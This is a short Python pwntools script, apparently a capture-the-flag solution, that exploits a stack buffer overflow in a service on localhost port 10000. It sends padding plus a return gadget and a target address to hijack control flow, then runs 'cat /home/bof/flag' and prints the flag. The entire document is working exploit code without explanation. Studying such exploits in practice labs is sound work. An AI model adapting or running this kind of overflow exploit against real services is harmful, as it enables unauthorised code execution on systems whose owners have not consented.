from pwn import *

s = remote('localhost', 10000)
ret = 0x400699
payload = b'A' * (0x30 + 8) + p64(ret) + p64(0x400687)

s.recvline()
s.sendline(payload)
s.sendline('cat /home/bof/flag')
print (s.recvline()[:-1].decode())
s.close()
